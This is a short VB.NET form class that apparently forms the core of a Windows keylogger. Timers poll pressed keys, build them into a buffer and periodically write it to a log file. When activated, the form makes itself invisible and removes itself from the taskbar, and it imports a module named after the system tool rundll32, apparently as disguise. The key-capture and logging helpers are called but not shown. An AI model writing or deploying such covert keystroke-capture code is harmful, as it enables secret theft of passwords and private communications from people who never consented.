Imports rundll32.Declarations

Public Class Form1

    Private Sub keyTimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles keyTimer.Tick
        Dim Ret As String
        Ret = GetPressedKey()
        If Ret <> sold Then
            sold = Ret
            sSave = sSave & " " & Trim(Ret)
            sSave = Trim(sSave)
        End If
    End Sub

    Private Sub action_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles action.Tick
        sSave = sSave + " "
        savelog(sSave)
        sSave = ""
    End Sub

    Private Sub startDelay_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles startDelay.Tick
        startDelay.Stop()
        init()
        startDelay.Enabled = False
    End Sub

    Private Sub Form1_Activated(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Activated
        Me.Visible = False
        Me.ShowInTaskbar = False
    End Sub

End Class
